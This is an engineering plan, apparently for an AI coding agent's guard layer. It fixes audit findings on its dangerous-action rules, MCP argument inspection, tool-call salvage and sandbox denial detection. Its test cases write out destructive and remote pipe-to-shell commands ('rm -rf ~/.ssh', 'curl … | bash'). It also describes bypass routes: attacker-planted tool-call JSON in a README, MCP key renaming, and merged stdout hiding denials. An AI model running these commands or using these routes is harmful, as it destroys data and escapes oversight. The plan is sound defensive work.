# Code-audit 2026-09-26 fixes — plan

**Goal:** Close every finding in `docs/reviews/code-audit-2026-09-26.md`, in the owner's tackle order: floor bypasses first, then injection/denial gaps, reopened protections, Windows fences, DoS caps, the ask latch, and the rest.
**Date:** 2026-09-26
**Status:** unexecuted
**sized for:** ~200k-context host
**base:** 3b54e29f
**Sources:**
- `docs/reviews/code-audit-2026-09-26.md`
- `docs/adr/0012-confinement-attaches-to-blast-radius-and-confine-to-workspace-flag.md`, `docs/adr/0019-*`, `docs/adr/0020-*`, `docs/adr/0056-terminal-fail-fast-and-session-scratch.md`, `docs/adr/0071-*`, `docs/adr/0074-*`
- `docs/design/confinement-execution-contract.md`, `docs/design/mcp-client.md`, `docs/design/test-drivers.md`, `CONTEXT.md`
- bead `apogee-ws7`

**Ratified design calls** (owner, 2026-09-26):
- **MCP payload default:** a tool that declares no payload role is fully inspected by every dangerous-action rule.
- **Declaration shape:** one per-tool argument-role declaration (payload | read-source | prompt | shell-command) replaces `PromptTool`, `ReadSourceTool`, `ShellCommandTool` and the global `payloadKeys`.
- **Salvage:** refuse a block that reproduces JSON found in a prior tool result; every salvaged call gets a non-debug transcript notice; no forced approval.
- **Denial watch:** stdout is watched only when the shell line merges streams (`2>&1`, `>&2`, `&>`, `|&`), with the line-anchored denial pattern only (no bare errno match).
- **Stream rescan:** throttle — past 256 KiB accumulated, re-strip only every 64 KiB of new bytes; final message stripped exactly.
- **PDF encryption:** any PDF whose trailer carries `/Encrypt` is refused.
- **Config writes:** a blocking sidecar lock `config.yaml.lock` beside the config file, held across read-splice-verify-rename.
- **Patch insertion:** a pure-insertion hunk is refused unless the target file is empty or the section is `*** Add File`.
- **probe model:** resolves `api-key-cmd:` fenced against the workspace root, as `apogee probe` does.
- **present.command on Windows:** `cmdSafe` applies when the resolved program is `cmd.exe` or a `.bat`/`.cmd` file.

**Standing requirements:**
- skills: coding-standards
- Any deviation from item text lands as a dated NOTES line under the item.
- Every fix item's new tests must fail against the pre-item tree.

**Out of scope:**
- CI workflow changes (Windows-only tests run in the existing `test-windows` job).
- Bench/live-model evaluation; VERSION and release acts.
- Audit findings outside `docs/reviews/code-audit-2026-09-26.md`.

**Regression check (2026-09-26):** 1: guard folded — `sub_agent_test.go`/`shellmarker_test.go` added to Files and rewritten against the new `domain.ArgRoleTool`. 2: guard folded — `MultiFindReplace` also declares its top-level `replacements` key with the payload role. 3: guard folded; yields to `internal/security/dangerous.go:222-227`'s payload-exclusion design (no longer reversed). 5: guard folded — `internal/probe/battery.go` added to Files as a second `SalvageToolCall` caller. 6: guard folded — `internal/agent/builtins.go` and `floorguards_test.go` added to Files; item 6 alone owns the Detail-wording change. 7: guard folded — `res.DenialStopped` ORs both the stderr and the new stdout watch. 8: guard folded; yields to `docs/adr/0056-terminal-fail-fast-and-session-scratch.md` decision 2 (no longer reversed). 9: guard folded — the Goal's console family enumeration is corrected (console_read/console_close read true). 11: guard folded — the indirect-`/Length` resolution order is stated and a fourth fixture added. 14: guard folded — `ReadSDDL`/`SetSDDL` keep their exported signature and `Journal.stat` stays the identity source; `confiner_windows_test.go` and `session.go` added to Files. 15: guard folded — `internal/platform/teardown_windows.go` added to Files. 18: guard folded — `capConsoleOutput`'s real truncation on the `console_read` path is kept; `console_read_test.go` added to Files. 19: guard folded — `internal/tui/mouse_test.go` added to Files; ask panes gain an `armAsk` latch mirroring approval's. 20: guard folded — the two ledger-survives assertions are inverted and the three doc comments they matched are rewritten. 22: guard folded; yields to `internal/platform/lock.go:74-81`'s never-removed invariant. 24: guard folded — `wire_boot.go` and `wire_firing_test.go` added to Files for the `int(...)` conversions; the Goal's doc clause is moved under the Approach. 28: guard folded — the comment sweep follows the reviewer's grep and `keyresolve_test.go` is added to Files; the Goal's doc clause is checked by a grep added to Acceptance. Items 4, 10, 12, 13, 16, 17, 21, 23, 25, 26, 27, 29, 30 were SAFE.

## 1. Unified per-tool argument-role declaration — ✅ DONE (2026-09-26)

NOTES (2026-09-26): `PromptArgKeys`, `ReadSourceArgKeys` and `ShellCommandArgKeys` are removed rather than kept as wrappers; every caller (guard, tests) now calls `domain.ArgKeysWithRole(tool, role)`. `ArgRole` is a string type (`payload`, `read-source`, `prompt`, `shell-command`) and `ArgKeysWithRole` returns keys sorted, so the sub_agent pin now reads `[continue name task]` instead of `[task name continue]` (order never mattered to the guard, which builds a set). `ArgRolePayload` is defined but no tool declares it yet and the global `payloadKeys` is untouched — items 2/3 own that migration.
NOTES (2026-09-26): consequential edit — internal/domain/tools_test.go: new `TestArgKeysWithRole` table (nil tool, undeclared, empty declaration, each role) the item's Tests line asks for; the file was not in Files.
NOTES (2026-09-26): consequential edit — internal/tools/file_ops_test.go: made necessary by removing `domain.ReadSourceArgKeys` (call and two comments naming `ReadSourceTool`).
NOTES (2026-09-26): consequential edit — internal/security/doc.go: made necessary by retiring `domain.PromptTool`/`ReadSourceTool`/`ShellCommandTool`/`PromptArgKeys` (comment names).
NOTES (2026-09-26): consequential edit — cmd/apogee/e2e_guard_controlplane_test.go: made necessary by retiring `domain.ShellCommandTool` (file comment).
NOTES (2026-09-26): consequential edit — docs/design/confinement-execution-contract.md: made necessary by retiring `domain.PromptArgKeys`/`domain.PromptTool` (amendment sentence now names `domain.ArgRolePrompt` / `ArgKeysWithRole`).
NOTES (2026-09-26): consequential edit — docs/adr/0049-an-approved-write-escape-executes-through-a-permit-pinned-to-the-disclosed-target.md: made necessary by retiring `domain.ShellCommandTool` (shell write view sentence now names `domain.ArgRoleShellCommand`).
NOTES (2026-09-26): the test `TestPromptArgKeysAreNoneForAToolThatDeclaresNone` keeps its name (no renames) though it now calls `ArgKeysWithRole(..., ArgRolePrompt)`; CHANGELOG mentions of the retired interfaces are historical and left as written.

**What:**
**Regression guard.** `internal/tools/sub_agent_test.go:16` and `internal/tools/shellmarker_test.go:36` compile-assert against the retired `domain.PromptTool`/`domain.ShellCommandTool` interfaces; both files are added to Files and rewritten to assert against the new `domain.ArgRoleTool` (or its role-typed helper) instead, so `go test -race -count=1 ./internal/tools/` still compiles.
**Goal:** `internal/domain` exposes one optional per-tool argument-role declaration (roles: payload, read-source, prompt, shell-command) and no `PromptTool`, `ReadSourceTool` or `ShellCommandTool` interface; every former implementer declares the same keys through it; guard behaviour is unchanged.
**Approach (assumed at the header base):** Replace the three optional interfaces in `internal/domain/tools.go` with one (e.g. `ArgRoleTool{ ArgRoles() map[string]ArgRole }`) plus a helper `ArgKeysWithRole(t Tool, r ArgRole) []string` (nil tool / no declaration → nil). Keep `PromptArgKeys`, `ReadSourceArgKeys`, `ShellCommandArgKeys` only if they become one-line wrappers over the helper; otherwise migrate callers. Migrate `SubAgent` (`internal/tools/sub_agent.go`), `CopyFile` (`file_ops.go`), `Terminal` (`terminal.go`), `ConsoleOpen`. Update `internal/domain/doc.go`'s optional-interface list and `stubTool` in `internal/security/dangerous_test.go`. Pure refactor: `refactor(domain)`.
**Files:** internal/domain/tools.go, internal/domain/doc.go, internal/tools/sub_agent.go, internal/tools/sub_agent_test.go, internal/tools/file_ops.go, internal/tools/terminal.go, internal/tools/console_open.go, internal/tools/shellmarker_test.go, internal/security/dangerous.go, internal/security/dangerous_test.go
**Read first:** internal/domain/tools.go — PromptTool, ReadSourceTool, ShellCommandTool; internal/tools/sub_agent_test.go — TestSubAgentDeclaresBothArgumentsAsDelegationPrompts (line 16); internal/tools/shellmarker_test.go — TestShellCommandMarkerOnTheRealShellTools; internal/tools/file_ops.go — CopyFile.ReadSourceKeys; internal/security/dangerous.go — Inspect
**Tests:** existing prompt/read-source/shell-key tests are rewritten to assert `domain.ArgRoleTool`/`ArgKeysWithRole` in place of the retired interfaces (`sub_agent_test.go:16`, `shellmarker_test.go:36`) and still pass; new `internal/domain` table test for `ArgKeysWithRole` (nil tool, undeclared, each role).
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/domain/ && go test -race -count=1 ./internal/security/ && go test -race -count=1 ./internal/tools/`
**Commit:** `refactor(domain): one per-tool argument-role declaration replaces three optional interfaces`

## 2. Built-in tools declare their payload arguments — ✅ DONE (2026-09-26)

NOTES (2026-09-26): the Goal's tool names map to the registry's real names — `file_edit` is `edit_existing_file`, `diff` is `view_diff`, `find_replace` is `single_find_and_replace`, `git` commit is `git_commit`; each declares the listed key(s) via `ArgRoles()`. The registry walk runs over `builtinTools(root, HostTools{})` so default-off and host-delegate tools (console family, load_skill, ask_user, present_document) are covered.
NOTES (2026-09-26): the test mirrors `internal/security`'s unexported `payloadKeys` as its own `payloadSpellings` set (the guard's map is unexported and `security` cannot import `tools`); it also adds `TestBuiltinToolArgRolesNameSchemaKeys`, which fails when any built-in tool declares a role for a key its schema lacks (catches a misspelled declaration). Guard behaviour is unchanged: `Inspect` does not yet read `ArgRolePayload` (item 3). No CHANGELOG entry — nothing user-observable changes until item 3 moves the exclusion onto the declaration.

**What:** Depends on item 1.
**Regression guard.** `multi_find_and_replace` (`MultiFindReplace`, `internal/tools/find_replace.go`) also declares its top-level `replacements` key with the payload role, so the registry test additionally asserts that declaration, since nested `oldText`/`newText` are reached only through it.
**Goal:** every built-in tool whose schema carries a key now in `payloadKeys` declares that key with the payload role: `write_file`/`file_edit` `content`, `diff` `newContent`, `find_replace` `oldText`/`newText`, `grep` and `find_files` `pattern`, `git` commit `message`, `web_search` and `load_skill` `query`, `ask_user` `question`/`choices`, `present_document` `title`, `http_request` `body`. A registry test fails when a built-in tool's schema key spelled like a payload key lacks the declaration.
**Approach (assumed at the header base):** Add `ArgRoles()` entries on each tool type in `internal/tools/`. The global `payloadKeys` still exists after this item, so behaviour is unchanged. The registry test iterates the default registry and each schema's top-level properties; it also asserts `MultiFindReplace` declares its top-level `replacements` key with the payload role (nested `oldText`/`newText` are reached only through it).
**Files:** internal/tools/write_file.go, internal/tools/file_edit.go, internal/tools/diff.go, internal/tools/find_replace.go, internal/tools/grep.go, internal/tools/find_files.go, internal/tools/git.go, internal/tools/web_search.go, internal/tools/load_skill.go, internal/tools/ask_user.go, internal/tools/present_document.go, internal/tools/http_request.go, internal/tools/argroles_test.go
**Read first:** internal/security/dangerous.go — payloadKeys map; internal/tools/write_file.go, file_edit.go, diff.go, find_replace.go, grep.go, git.go — ArgRoles(); internal/tools/argroles_test.go (new)
**Tests:** `go test -race -count=1 -run ArgRole ./internal/tools/` — includes the registry assertion that `MultiFindReplace` declares its top-level `replacements` key with the payload role.
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/tools/`
**Commit:** `feat(tools): built-in tools declare their payload arguments`

## 3. Dangerous-action payload exclusion is per tool, never by name — ✅ DONE (2026-09-26)

NOTES (2026-09-26): `TestDangerousActionGuard_PayloadTextNotInspected` moved into a new external-package file `internal/security/dangerous_payload_test.go` (`package security_test`): `internal/tools` imports `internal/security`, so an in-package test cannot hold the real `*tools.MultiFindReplace` the item requires. Every row there now passes its real built-in tool (`WriteFile`, `Grep`, `GitCommit`, `SingleFindReplace`, `MultiFindReplace`, `WebSearch`), and the call names use the registry's real tool names. A control test (`_PayloadExemptionNeedsTheDeclaringTool`) shows the same nested-replacements call is hard-refused with a nil tool.
NOTES (2026-09-26): the depth-0 skip is applied to every tool-declared key set (payload, prompt, read-source, shell-command), not only payload: all declarations name top-level argument keys, and a single `collectArgs` helper does the top-level skip. For prompt/read-source/shell keys this only tightens: a same-spelled key nested inside another argument is now inspected, where before it was dropped at any depth. No existing test depended on the nested drop (security, tools, mcp, agent, domain suites green).
NOTES (2026-09-26): new tests `TestDangerousActionGuard_PayloadExclusionIsPerTool` (stub tools: MCP-shaped and nil-tool `body`/`message`, nested `{"x":{"body":…}}`, undeclared sibling, declared top-level payload excluded) and two new rows in `_ActionKeysStillInspected`; `_PayloadKeySpellingVariants` now passes a stub `view_diff` declaring `newContent`/`message`. `stubTool` gained a `payloadKeys` field. The MCP pin `TestServerToolDeclaresNoArgRoles` also runs the default guard over a `serverTool` `body` argument. Against the pre-item `dangerous.go`, seven of the new subtests and the control test fail.
NOTES (2026-09-26): `docs/manual/configuration.md` never described the payload exemption, so there was no by-name sentence to rewrite; a short paragraph was added to "The dangerous-action guard" stating the per-tool exemption and that MCP tool arguments are checked in full. In `internal/security/doc.go` the "Two tool-declared argument classes" sentence (which listed three) now reads "Three more".
NOTES (2026-09-26): consequential edit — internal/tools/argroles_test.go: made necessary by deleting `payloadKeys` (its `payloadSpellings` doc comment named the removed list).

**What:** Depends on item 2. Fixes the audit's High "Any MCP tool can rename its way past the Tier-1 hard-refuse floor".
**Regression guard.** A payload role on a top-level key skips that key's whole value (arrays/objects included) at depth 0 — `MultiFindReplace`'s `replacements` declaration (item 2) keeps the "nested replacements payload" case un-refused; that test case calls `Inspect` with the real `*MultiFindReplace` tool, not `nil`. Nested keys of undeclared or MCP tools stay fully inspected. This keeps `internal/security/dangerous.go:222-227`'s payload-exclusion design intact for `multi_find_and_replace` — the item yields to that documented decision rather than reversing it.
**Goal:** `DangerousActionGuard.Inspect` excludes an argument from inspectable text only when the call's own tool declares it with the payload role, and only at the top level of the arguments; a nil tool, an MCP tool, or an undeclared key is fully inspected, nested objects included. `{"tool":"mcp_x","arguments":{"body":"rm -rf ~/.ssh"}}` and `{"arguments":{"x":{"body":"rm -rf /"}}}` are hard-refused.
**Approach (assumed at the header base):** In `internal/security/dangerous.go` delete `payloadKeys`/`isPayloadKey`; `inspectableText` and `shellWriteText` take the skip set from `domain.ArgKeysWithRole(tool, payload)` (keep `keySpelling` normalisation); `collectStrings` applies the skip at depth 0 only. Switch `TestDangerousActionGuard_PayloadTextNotInspected` / `_PayloadKeySpellingVariants` from `nil` tool to stub tools declaring the keys; add MCP-shaped cases; pin in `internal/mcp/tool_test.go` that `serverTool` declares no roles. Docs: rule "every text that says payload keys are excluded by name" — `internal/security/doc.go`, `CONTEXT.md` dangerous-action entry, `docs/design/confinement-execution-contract.md`, `docs/manual/configuration.md` §"The dangerous-action guard"; add a 2026-09-26 amendment to ADR 0012 recording the per-tool payload exemption and the MCP-fully-inspected default (`grep -rn "payload" CONTEXT.md docs/manual docs/design internal/security/doc.go`).
**Files:** internal/security/dangerous.go, internal/security/dangerous_test.go, internal/security/doc.go, internal/mcp/tool_test.go, CONTEXT.md, docs/design/confinement-execution-contract.md, docs/manual/configuration.md, docs/adr/0012-confinement-attaches-to-blast-radius-and-confine-to-workspace-flag.md
**Read first:** internal/security/dangerous.go — Inspect, inspectableText, collectStrings; internal/security/dangerous_test.go — TestDangerousActionGuard_PayloadTextNotInspected (line 189), stubTool; internal/tools/find_replace.go — MultiFindReplace, multiFindReplaceSpec; internal/mcp/tool_test.go — serverTool
**Closes:** apogee-ws7
**Tests:** `go test -race -count=1 -run 'DangerousAction|Payload' ./internal/security/`; `go test -race -count=1 ./internal/mcp/` — the "nested replacements payload" case in `TestDangerousActionGuard_PayloadTextNotInspected` calls `Inspect` with the real `*MultiFindReplace` tool, not `nil`.
**Acceptance:** `go test -race -count=1 ./internal/security/ && go test -race -count=1 ./internal/mcp/ && go test -race -count=1 ./internal/tools/`
**Commit:** `fix(security): payload-key exclusion is declared per tool; MCP arguments are fully inspected`

## 4. remote-pipe-to-shell catches a shell at any pipeline stage — ✅ DONE (2026-09-26)

NOTES (2026-09-26): deviation from the Approach's `[^;&\n]*` — the download's own (first) stage keeps the old separator-crossing `[^|]*`, and only the stages after it use the separator-bounded `pipeStageAtom`; a first stage that stopped at `;`/`&&`/`&` would let `curl -o i.sh u && cat i.sh | sh` and `curl -o f u; cat f | bash` (both forced approval before this item) through, a floor regression. With zero later stages the pattern is the old one verbatim, so every command the pre-item pattern matched still matches; both chains are must-trigger cases in rules_test.go.
NOTES (2026-09-26): consequence of that first-stage choice — `curl -o x u & echo hi | bash` forces approval (as it did before this item); its rules_test.go case is want=true. `curl -o x u; bash build.sh` (the Goal's near-miss) stays clear because it holds no `|` at all.
NOTES (2026-09-26): a later stage's crossing part excludes `||` and a bare `&` as well as `;`: a `&` inside a stage still counts when it is a redirection (`2>&1`, `<&0`, `&>f`), so `curl u | tee log 2>&1 | sh` matches.
NOTES (2026-09-26): newline is not in the excluded set — `normalize` folds every whitespace run to a space before any rule runs, so newline-separated commands read as one line; that behaviour predates this item.
NOTES (2026-09-26): quoted strings (`"[^"]*"`, `'[^']*'`) and a backslash-escaped metacharacter are later-stage atoms (the `pipeStageAtom` const); the escape atom is `[\\/][|;&]` rather than `\\.` because `normalize` folds `\` to `/` before any rule runs. The quoted/escaped URL must-trigger cases stay in rules_test.go (the first stage's `[^|]*` covers them there).
NOTES (2026-09-26): docs/manual/configuration.md left unchanged — its `curl … | sh` idiom wording does not state first-stage-only.

**What:** Fixes the audit's High "Multi-stage pipe to a shell skips the remote-code-execution approval gate".
**Goal:** the default `remote-pipe-to-shell` rule forces approval for `curl https://x/i.sh | tee i.sh | bash`, `wget -qO- u | sudo sh`, `curl u | cat | /bin/zsh`, and still passes `curl u | grep x`, `curl u | shellcheck -`, `curl -o x u; bash build.sh`.
**Approach (assumed at the header base):** In `DefaultDangerousRules` (`internal/security/rules.go`) widen the pattern's `[^|]*` so the match may cross later `|` separators but not `;`, `&`, or a newline (e.g. `[^;&\n]*\|\s*…`); rule stays regex-only so `MergeDangerousRules` and python/MCP text coverage are unchanged. Update the `curl … |` idiom wording in `docs/manual/configuration.md` only if it states first-stage-only.
**Files:** internal/security/rules.go, internal/security/rules_test.go, internal/security/dangerous_test.go, docs/manual/configuration.md
**Read first:** internal/security/rules.go — DefaultDangerousRules, "remote-pipe-to-shell" rule (line 234-238); internal/security/dangerous_test.go — must-trigger cases (88-94), must-pass cases (133-136); docs/manual/configuration.md — curl idiom wording (~2209)
**Tests:** `go test -race -count=1 -run 'Rules|PipeToShell|DangerousAction' ./internal/security/`
**Acceptance:** `go test -race -count=1 ./internal/security/`
**Commit:** `fix(security): remote-pipe-to-shell matches a shell at any later pipeline stage`

## 5. Salvage refuses tool-call JSON quoted from a prior tool result — ✅ DONE (2026-09-26)

NOTES (2026-09-26): re-derived from "the probe passes its response's (empty) `.View().Conversation()`" — `domain.NewResponse(..., nil)` carries a nil view, so calling `Conversation()` on it would panic; `salvageableCallName` passes a nil history instead, which `SalvageToolCall` treats as no prior conversation (same answer, no quotes).
NOTES (2026-09-26): "whitespace-collapsed" is implemented as all whitespace removed from both the block and the tool result before the substring test, so a reindented copy still matches; it can only refuse more, never salvage more.

**What:** Fixes the audit's High "Tool-call salvage can execute attacker-planted JSON".
**Regression guard.** Add `internal/probe/battery.go` to Files — `salvageableCallName` builds its response first and passes that response's empty conversation view as the new argument, so the probe's answer is unchanged.
**Goal:** `floor.SalvageToolCall` returns no call for a block whose decoded JSON object equals a JSON object present in any prior tool-result message of the conversation, or whose whitespace-collapsed text is a substring of one; a block the model wrote itself is still salvaged.
**Approach (assumed at the header base):** Widen `SalvageToolCall` to take the conversation view (keep it pure); caller `(*Agent).salvageToolCall` in `internal/agent/builtins.go` passes `resp.View().Conversation()`. `internal/probe/battery.go`'s `salvageableCallName` is a second caller: it builds its response first and passes that response's (empty) `.View().Conversation()` as the new argument, so the probe's synthetic response carries no history and its answer is unchanged. Extract candidate objects from tool results with the same extractors (`fencedBlockPattern`, `toolCallTagPattern`, whole-text parse) and compare decoded values with `reflect.DeepEqual` on `name` + `arguments`. Leave `HasToolCallMarkup` unchanged. Update the ADR 0071 seventh-guard amendment and the `CONTEXT.md` Floor-guard bullet with the quoted-content refusal.
**Files:** internal/floor/salvage.go, internal/floor/salvage_test.go, internal/agent/builtins.go, internal/agent/floorguards_test.go, internal/probe/battery.go, CONTEXT.md, docs/adr/0071-*.md
**Read first:** internal/floor/salvage.go — SalvageToolCall, parseSalvagedCall; internal/agent/builtins.go — (*Agent).salvageToolCall; internal/probe/battery.go — salvageableCallName; internal/floor/salvage_test.go — TestSalvageToolCallReadsAWrittenCall; internal/domain/hooks.go — LoopView.Conversation
**Tests:** `go test -race -count=1 -run Salvage ./internal/floor/ ./internal/agent/` — a README tool result carrying a fenced `write_file` call echoed by the model is not dispatched; `go build ./...` and `go test -race -count=1 ./internal/probe/` confirm `salvageableCallName` still compiles and answers unchanged against the widened signature.
**Acceptance:** `go build ./... && go test -race -count=1 ./internal/floor/ && go test -race -count=1 ./internal/agent/ && go test -race -count=1 ./internal/probe/`
**Commit:** `fix(floor): salvage refuses tool-call JSON reproduced from a prior tool result`

## 6. Salvaged calls are announced outside debug view — ✅ DONE (2026-09-26)

NOTES (2026-09-26): re-derived from the assumption that addReaction can branch on `guardActionSalvage` — it is unexported in internal/agent and the TUI does not import that package, so transcript.go spells the label as its own `reactionActionSalvage = "salvage"` constant, as advicepane.go already does for the advise labels.
NOTES (2026-09-26): re-derived from the assumption that docs/manual/commands.md describes salvage's rendering — it only lists the `/settings` row; the Floor-guard behaviour is described in docs/manual/configuration.md, which gained the announcement sentence instead. layout.md lists no debug-only reaction lines and was left unchanged.
NOTES (2026-09-26): consequential edit — cmd/apogee/testdata/eventlines/identity-salvage.txt: made necessary by the salvage Detail change in internal/agent/builtins.go (now the bare tool names, `detail=read_file`); this plan's ratified Detail change supersedes the golden's frozen `salvaged read_file from content` wording.

**What:** Depends on item 5.
**Regression guard.** `addReaction` branches on `e.Action == guardActionSalvage` before the generic template and renders `"tool call salvaged from reply text: " + <tool names>`, since the generic `reaction %s @ %s: %s (%s)` template cannot produce the Goal's pinned wording. `(*Agent).salvageToolCall`'s Detail (`internal/agent/builtins.go:271`) becomes `strings.Join(names, ", ")` so the branch has a clean value; `internal/agent/builtins.go` is added to Files — item 6 alone owns this Detail-wording change, item 5 does not touch it — and the existing wording pin at `internal/agent/floorguards_test.go:965-966` (`"salvaged read_file from content"`) is updated to `"read_file"`.
**Goal:** every salvaged-and-dispatched call renders a transcript line `tool call salvaged from reply text: <tool names>` in the default (non-debug) TUI view; other reaction lines keep their debug-only rule.
**Approach (assumed at the header base):** In `internal/tui/transcript.go` `addReaction`, branch on `e.Action == guardActionSalvage` before the generic template and let the salvage line through when `!t.debug`, rendered with the existing notice style. Change `(*Agent).salvageToolCall`'s Detail (`internal/agent/builtins.go:271`) to `strings.Join(names, ", ")`. Update the ADR 0071 amendment's "notice is debug-view only" line, `docs/manual/commands.md` where salvage is described, and `layout.md` if it lists debug-only reaction lines.
**Files:** internal/tui/transcript.go, internal/tui/transcript_test.go, internal/agent/builtins.go, internal/agent/floorguards_test.go, docs/adr/0071-*.md, docs/manual/commands.md, layout.md
**Read first:** internal/tui/transcript.go — addReaction; internal/tui/transcript_test.go — TestTranscriptReactionGatedByDebug (lines 1103, 1118, 1133); internal/agent/floorguards.go — guardActionSalvage; internal/agent/builtins.go — salvageToolCall (Detail, line 271); internal/agent/floorguards_test.go — guardDetailFor assertion (line 965)
**Tests:** `go test -race -count=1 -run Salvage ./internal/tui/ ./internal/agent/` — `floorguards_test.go`'s Detail-wording assertion is updated to `"read_file"`.
**Acceptance:** `go test -race -count=1 ./internal/tui/ && go test -race -count=1 ./internal/agent/`
**Commit:** `feat(tui): a salvaged tool call is announced in the default transcript`

## 7. Anchored denial watch writer and a merged-stdout spec flag — ✅ DONE (2026-09-26)

NOTES (2026-09-26): the constructor is `platform.NewAnchoredDenialKillWriter` (the DenialKillWriter now carries its own line matcher; `LooksLikeConfinementDenial` and the scan share one `anyLineMatches` helper); `WatchMergedStdout` is also ignored on a `RunSubprocessTo` run (streamed stdout is a payload, like SplitStdout), and the SplitStdout exclusion got a test case of its own.
NOTES (2026-09-26): no CHANGELOG entry for this item — the flag has no caller until item 8 arms it from `terminal`, which is where the user-visible fix lands.

**What:** Fixes (with item 8) the audit's High "Merged stdout hides the OS denial message".
**Regression guard.** `internal/subprocess/subprocess.go:327` sets `res.DenialStopped` from the stderr watch alone; OR both watches' `Detected()` into it (or share one atomic flag) — `res.DenialStopped = (denialWatch != nil && denialWatch.Detected()) || (stdoutWatch != nil && stdoutWatch.Detected())` — so a kill the new stdout-only watch triggers still reports `DenialStopped` and renders `confinementDenialStopLabel`.
**Goal:** `internal/platform` offers a denial-kill writer that matches only the line-anchored denial pattern (`denialLinePattern`, never `denialErrnoPattern`); `SubprocessSpec` carries a flag that, on a confined run without `SplitStdout`, wraps stdout in that writer too; with the flag off, stdout stays unwatched.
**Approach (assumed at the header base):** Add a constructor beside `NewDenialKillWriter` in `internal/platform/denialkill.go` parameterised on the matcher; add `SubprocessSpec.WatchMergedStdout` read in `run()` (`internal/subprocess/subprocess.go`), and OR both watches' `Detected()` into `res.DenialStopped` (line 327) so a stdout-only kill still reports it. Keep `TestRunSubprocessDenialWatchIgnoresStdout` for the flag-off case; add flag-on kill and a flag-on non-kill for a stdout line containing `EACCES` mid-line.
**Files:** internal/platform/denialkill.go, internal/platform/denialkill_test.go, internal/subprocess/subprocess.go, internal/subprocess/subprocess_test.go
**Read first:** internal/platform/denialkill.go — NewDenialKillWriter, DenialKillWriter; internal/subprocess/subprocess.go — run, res.DenialStopped (line 327); internal/subprocess/subprocess_test.go — TestRunSubprocessDenialWatchIgnoresStdout; internal/tools/terminal.go — subprocessToolResult
**Tests:** `go test -race -count=1 -run Denial ./internal/platform/ ./internal/subprocess/` — a flag-on kill via the stdout-only watch sets `res.DenialStopped`.
**Acceptance:** `go test -race -count=1 ./internal/platform/ && go test -race -count=1 ./internal/subprocess/`
**Commit:** `feat(subprocess): opt-in anchored denial watch on merged stdout`

## 8. terminal arms the stdout watch for a stream-merging line — ✅ DONE (2026-09-26)

NOTES (2026-09-26): `confinetest.Probe` gains a second `DenialKillerFactory` parameter (the anchored stdout watch) — confinetest cannot import `internal/platform` (the documented import cycle), so the merged-stream probe can only run the real anchored writer if the drivers hand it in; `denialkill_test.go` gains `newProbeMergedDenialKiller` beside `newProbeDenialKiller`.
NOTES (2026-09-26): consequential edit — internal/platform/denialkill_test.go: made necessary by the new `Probe` factory parameter (adapter for `NewAnchoredDenialKillWriter`).
NOTES (2026-09-26): consequential edit — internal/platform/landlock_linux_test.go: made necessary by the new `Probe` factory parameter (call site passes the adapter).
NOTES (2026-09-26): consequential edit — internal/platform/namespace_linux_test.go: made necessary by the new `Probe` factory parameter (call site passes the adapter).
NOTES (2026-09-26): consequential edit — internal/platform/seatbelt_darwin_test.go: made necessary by the new `Probe` factory parameter (call site passes the adapter).
NOTES (2026-09-26): consequential edit — internal/platform/confiner_windows_test.go: made necessary by the new `Probe` factory parameter (call site passes the adapter).
NOTES (2026-09-26): consequential edit — docs/design/confinement-execution-contract.md: made necessary by the new battery case (§6.2 table row #14 plus a dated amendment note).
NOTES (2026-09-26): the merge check arms on every platform, not POSIX alone — the confined run's stderr watch is wired on Windows too, and `2>&1` / `1>&2` are cmd syntax; the check is a substring match over the unparsed line, so a merge spelled inside quotes also arms (stricter scan only). The merged-stream battery row ran for real under the namespace backend here (landlock/seatbelt/Windows drivers vetted by cross-GOOS `go vet`).

**What:** Depends on item 7. Fixes the audit's High "Merged stdout hides the OS denial message".
**Regression guard.** The merge-redirect regex runs on `args.Command` (the model's original line) before `platform.FailFastPreamble()` is prepended — never on the preamble-prefixed string, whose ERR trap contains `>&2` (which would otherwise arm the stdout watch on every confined POSIX call, reintroducing the 2026-09-16 stdout-false-positive incident ADR 0056 decision 2 closed). This item yields to that ADR 0056 decision rather than reversing it. A test asserts a POSIX terminal call without a merge redirect leaves `WatchMergedStdout` false.
**Goal:** a confined `terminal` call whose command contains `2>&1`, `>&2`, `&>` or `|&` runs with the merged-stdout watch; `mkdir /outside 2>&1 && cd /outside && touch clobber` is killed before `touch` runs; a line without a merge redirect keeps the stderr-only watch.
**Approach (assumed at the header base):** In `internal/tools/terminal.go` detect the redirect with a small regex run against `args.Command` (the model's original line) BEFORE `command = platform.FailFastPreamble() + command` (line 149) — never against the preamble-prefixed `command` string, whose ERR trap contains `>&2` — and set `WatchMergedStdout`. Add a merged-stream case to the escape battery in `internal/platform/confinetest/confinetest.go` beside `chained_script_clobber_denied`. Add a 2026-09-26 amendment to ADR 0056 decision 2 and update the `Terminal` doc comment.
**Files:** internal/tools/terminal.go, internal/tools/terminal_test.go, internal/platform/confinetest/confinetest.go, docs/adr/0056-terminal-fail-fast-and-session-scratch.md
**Read first:** internal/tools/terminal.go — Execute, args.Command/command/failFast (146-173); internal/platform/host.go — failFastPreamble (544-546); internal/platform/confinetest/confinetest.go — Probe, DenialKillerFactory; docs/adr/0056-*.md — decision 2
**Tests:** `go test -race -count=1 -run 'Terminal|Merge' ./internal/tools/`; `go test -race -count=1 ./internal/platform/...` — a plain `cat build.log` (no merge redirect) leaves `WatchMergedStdout` false even though the prepended fail-fast preamble contains `>&2`.
**Acceptance:** `go test -race -count=1 ./internal/tools/ && go test -race -count=1 ./internal/platform/...`
**Commit:** `fix(tools): terminal watches merged stdout for confinement denials`

## 9. Tool definitions carry a read-only bit — ✅ DONE (2026-09-26)

NOTES (2026-09-26): the wrap-up menu's single write_file entry (toolMenu's wrappingUp branch) is stamped too, so every ToolDef the loop builds carries the bit; the new test TestLoopViewToolDefsCarryTheReadOnlyBit reads the menu through loopView(0).Tools() and was confirmed to fail with the loop.go stamping removed.

**What:**
**Regression guard.** Correct the Goal's console family enumeration: `console_open`, `console_send` read false; `console_read`, `console_close` read true (`ConsoleRead.ReadOnly()`/`ConsoleClose.ReadOnly()` already return `true`, pinned by `TestPlanAdmitsTheReadOnlyHalfOfTheConsoleFamily`) — item 10's cache-invalidation depends on this split holding.
**Goal:** `domain.ToolDef` carries `ReadOnly bool`, set from `domain.IsReadOnly(t)` wherever the loop builds the tool list a `LoopView` exposes; MCP tools, `terminal`, `python_exec`, `console_open`, `console_send`, `sub_agent`, `git_branch` read false; `console_read`, `console_close` read true.
